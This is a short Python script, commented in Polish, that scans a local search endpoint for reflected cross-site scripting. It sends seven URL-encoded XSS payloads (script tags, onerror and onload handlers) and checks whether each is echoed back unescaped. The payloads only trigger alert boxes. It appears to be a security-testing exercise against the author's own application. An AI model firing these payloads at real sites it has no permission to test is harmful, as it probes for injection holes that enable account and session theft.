import requests  #biblioteka do wykonywania żądań HTTP
import urllib.parse  #do kodowania payloadów w URL

#lista potencjalnych złośliwych skryptów JavaScript (XSS payloady)
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "><svg/onload=alert(1)>",
    "\"><script>alert('XSS')</script>",
    "<body onload=alert('XSS')>"
]

#bazowy adres URL podatnego endpointu (
base_url = "http://localhost:3000/search?q="

#interujemy po liscie zlosliwych skryptow
for payload in payloads:
    encoded_payload = urllib.parse.quote(payload)  #kodujemy payload do postaci URL (np. < -> %3C)
    test_url = base_url + encoded_payload  #budujemy pełny URL z wstrzykniętym payloadem

    print(f"[TEST] Wysyłanie żądania: {test_url}")  #logujemy testowany adres

    #wysyłamy żądanie GET z payloadem XSS
    response = requests.get(test_url)

    #sprawdzamy, czy payload pojawił się w treści odpowiedzi (HTML strony)
    if payload in response.text:
        print(f"Możliwa podatność na XSS! Payload widoczny w odpowiedzi:\n    {payload}\n")
    else:
        print("Brak oznak podatności.\n")
